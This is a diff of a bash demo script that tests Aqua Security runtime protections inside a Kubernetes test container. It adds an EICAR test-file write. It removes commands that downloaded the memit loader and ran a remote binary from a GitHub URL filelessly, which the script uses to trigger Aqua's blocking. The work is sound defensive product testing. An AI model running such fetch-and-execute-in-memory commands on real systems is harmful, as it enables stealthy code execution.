@@ -102,7 +102,7 @@ check_container_existence() {
     return $?
 }
 
-test_realtime_malware_protection() {
+test_realtime_malware_protection_wget() {
     if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
         prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
     else
@@ -127,7 +127,7 @@ test_realtime_malware_protection() {
                 echo
                 print_colored_message yellow "Executing 'ls -la' command in the container..."
                 echo
-                kubectl exec -it $pod_name --container $container_name -- ls -la
+                kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
                 sleep 1.5
                 echo
                 print_colored_message yellow "Executing wget command in the container to download eicar AMP test file..."
@@ -146,7 +146,7 @@ test_realtime_malware_protection() {
                 echo
                 print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
                 echo 
-                kubectl exec -it $pod_name --container $container_name -- ls -la
+                kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
                 echo
                 print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
 
@@ -161,6 +161,76 @@ test_realtime_malware_protection() {
             echo "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
+}
+
+test_realtime_malware_protection() {
+  # Split and concatenate the EICAR string (done at the start for consistency)
+  string1='X5O!P%@AP[4\PZX54(P^)'
+  string2='7CC)7}$EICAR-STANDARD'
+  string3='-ANTIVIRUS-TEST-FILE!$H+H*'
+  eicar_string="$string1$string2$string3"
+
+  if [ "$AQUA_WARDEN_SKIP_INSTRUCTIONS" ]; then
+    prerequisites_met="Y"
+  else
+    # Ask user if prerequisites are met
+    echo
+    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
+    1. Create a Custom Policy with Real-time Malware Protection Control enabled
+    2. Ensure that the Real-time Malware Protection Control is set to 'Delete' action
+    3. Ensure that the Custom Policy is set to 'Enforce' mode
+    4. Ensure that Block Container Exec Control is disabled"
+
+    echo
+    read -p "Proceed? (y/n): " prerequisites_met
+  fi
+
+  case $prerequisites_met in
+    [Yy]*)
+      if check_container_existence; then
+        pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+        container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+        echo
+        print_colored_message yellow "Executing 'ls -la' command in the container..."
+        echo
+        kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
+        sleep 1.5
+
+        # Create the eicar.txt file and write the concatenated string
+        echo
+        print_colored_message yellow "Creating and writing EICAR string to eicar.txt in the container..."
+        echo
+        kubectl exec -it $pod_name --container $container_name -- bash -c "touch /tmp/eicar.txt && echo '$eicar_string' > /tmp/eicar.txt"
+        if [ $? -eq 0 ]; then
+          echo
+          print_colored_message yellow "Eicar string written to file successfully."
+        else
+          echo
+          print_colored_message red "Failed to write Eicar string to file."
+        fi
+        
+        sleep 1.5
+        echo
+        print_colored_message yellow "Executing 'ls -la' command again in the container..."
+        echo
+        print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
+        echo
+        kubectl exec -it $pod_name --container $container_name -- ls -la /tmp/
+        echo
+        print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
+
+      else  
+        print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
+      fi
+      ;;
+
+    [Nn]*)
+      echo "Please ensure the prerequisites are met before proceeding."
+      ;;
+    *)
+      echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+      ;;
+  esac
 }
 
 
@@ -266,8 +336,7 @@ test_block_fileless_execution() {
         print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
         1. Create a Custom Policy with Block Fileless Execution Control enabled
         2. Ensure that the Custom Policy is set to 'Enforce' mode
-        3. Ensure that Drift Prevention Control is disabled
-        4. Ensure that Block Container Exec Control is disabled"
+        3. Ensure that Block Container Exec Control is disabled"
         echo
         read -p "Proceed? (y/n): " prerequisites_met
     fi
@@ -279,18 +348,9 @@ test_block_fileless_execution() {
                 pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing 'wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64' command in the container..."
+                print_colored_message yellow "Executing './memrun filess /bin/wget' command in the container..."
                 echo
-                kubectl exec -it $pod_name --container $container_name -- wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64
-                echo
-                print_colored_message yellow "Executing 'chmod +x memit-linux-amd64' command in the container..."
-                echo
-                kubectl exec -it $pod_name --container $container_name -- chmod +x memit-linux-amd64
-                echo
-                print_colored_message yellow "Executing './memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist' command in the container..."
-                echo
-                kubectl exec -it $pod_name --container $container_name -- ./memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist
-                echo
+                kubectl exec -it $pod_name --container $container_name -- ./tmp/memrun fieless /bin/wget
                 print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                 echo
                 print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
@@ -602,7 +662,7 @@ main() {
         echo "2. Test Real-time Malware Protection [Delete action]"
         echo "3. Test Drift Prevention"
         echo "4. Test Block Cryptocurrency Mining"
-        echo "5. Test Block Fileless Execution [Must Turn off Drift Prevention Control in Aqua Console]"
+        echo "5. Test Block Fileless Execution"
         echo "6. Test Reverse Shell"
         echo "7. Test Executables Blocked [ps]"
         echo "8. Test Block Container Exec"
